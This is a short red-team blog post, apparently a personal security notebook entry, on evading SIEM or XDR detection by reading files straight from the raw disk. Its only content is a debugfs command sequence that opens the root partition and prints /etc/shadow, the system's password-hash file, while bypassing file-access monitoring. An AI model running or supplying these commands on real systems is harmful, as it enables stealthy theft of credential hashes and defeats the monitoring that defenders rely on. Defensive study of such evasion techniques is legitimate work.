---
title:  "Avoid SIEM or XDR detection"
date:   2022-12-09
excerpt: ""
categories: informationsecurity
tags: 
- xdr
- edr
- red team
toc: true
toc_label: "My Table of Contents"
toc_icon: "cog"
classes: wide
---

## red from raw disk

Your useraccount still needes accessrights to this file

```bash
# find disk name
df /

# open file on disk
debugfs
  open /dev/sda2
  cd /etc
  cat shadow
```

Reference[^1]

[^1]<https://twitter.com/0xm1rch/status/1600857731073654784>
